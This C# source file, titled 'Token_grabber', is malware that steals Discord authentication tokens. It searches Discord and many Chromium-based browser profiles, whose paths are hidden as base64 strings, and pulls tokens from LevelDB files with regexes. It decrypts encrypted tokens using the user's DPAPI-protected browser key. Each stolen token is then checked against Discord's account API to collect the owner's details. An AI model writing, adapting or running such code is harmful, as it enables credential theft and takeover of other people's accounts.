using System;
using System.Collections.Generic;
using System.IO;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Linq;
using System.Web.Script.Serialization;
using System.Net;

namespace Token_grabber
{
    public class grabber
    {
        public static JavaScriptSerializer serializer = new JavaScriptSerializer();
        public static Dictionary<object, object> ObjectToDictionary(object obb)
        {
            return JsonToDictionary(DictionaryToJson(obb));
        }
        public static Dictionary<object, object>[] ObjectToArray(object obb)
        {
            return serializer.Deserialize<Dictionary<object, object>[]>(DictionaryToJson(obb));
        }
        public static Dictionary<object, object> JsonToDictionary(string json)
        {
            return serializer.Deserialize<Dictionary<object, object>>(json);
        }
        public static string DictionaryToJson(object dict)
        {
            return serializer.Serialize(dict);
        }
        private static List<string> GrabTokens(string leveldb_path, string localstate_path)
        {
            List<string> tokens = new List<string>();
            Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(leveldb_path, "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match1 = BasicRegex.Match(contents);
                if (match1.Success) tokens.Add(match1.Value);
                Match match2 = NewRegex.Match(contents);
                if (match2.Success) tokens.Add(match2.Value);

                Match match3 = EncryptedRegex.Match(contents);
                if (match3.Success)
                {
                    string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), localstate_path);
                    tokens.Add(token);
                }
            }

            return tokens;
        }

        private static byte[] Decryptkey(string path)
        {
            Dictionary<object, object> DeserializedFile = JsonToDictionary(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)ObjectToDictionary(DeserializedFile["os_crypt"])["encrypted_key"]).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        private static string DecryptToken(byte[] buffer, string localstate_path)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(Decryptkey(localstate_path)), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        public static List<string> grab()
        {
            List<string> pre_done = new List<string>();
            string appdata = @"XEFwcERhdGE=";
            string user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string locallevel = "XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==";
            string[] paths = new string[] { "XFJvYW1pbmdcZGlzY29yZA==", "XFJvYW1pbmdcZGlzY29yZHB0Yg==", "XFJvYW1pbmdcZGlzY29yZGNhbmFyeQ==", "XFJvYW1pbmdcZGlzY29yZGRldmVsb3BtZW50", "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl", "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl",
            "XExvY2FsXEFtaWdvXFVzZXIgRGF0YQ==","XExvY2FsXFRvcmNoXFVzZXIgRGF0YQ==", "XExvY2FsXEtvbWV0YVxVc2VyIERhdGE=", "XExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQ=","XExvY2FsXE9yYml0dW1cVXNlciBEYXRh","XExvY2FsXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==", "XExvY2FsXDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==",
            "XExvY2FsXFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=", "XExvY2FsXFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHQ=", "XExvY2FsXEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==", "XExvY2FsXEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==", "XExvY2FsXHVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YVxEZWZhdWx0"
            , "XExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXE9wZXJhIFNvZnR3YXJlXE9wZXJhIE5lb25cVXNlciBEYXRhXERlZmF1bHQ=", "XExvY2FsXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA=="};
            foreach (string i in paths)
            {
                string localdb = user + Encoding.UTF8.GetString(Convert.FromBase64String(appdata)) + Encoding.UTF8.GetString(Convert.FromBase64String(i)) + Encoding.UTF8.GetString(Convert.FromBase64String(locallevel));
                string localstate = user + Encoding.UTF8.GetString(Convert.FromBase64String(appdata)) + Encoding.UTF8.GetString(Convert.FromBase64String(i)) + "\\Local State";
                if (localstate.Contains("\\Default")) localstate = localstate.Replace("\\Default", "");
                if (Directory.Exists(localdb) && File.Exists(localstate)) pre_done.AddRange(GrabTokens(localdb, localstate));
            }
            pre_done = pre_done.Distinct().ToList();
            List<string> done = new List<string>();
            foreach (string i in pre_done)
            {
                try
                {
                    List<string> ids = new List<string>();
                    using (var client = new WebClient())
                    {
                        client.Headers.Add("authorization", i);
                        string e = client.DownloadString("https://discord.com/api/v9/users/@me");
                        done.Add(i + ": " + e);
                        client.Dispose();
                    }
                }
                catch
                {

                }
            }
            return done;
        }
    }
}
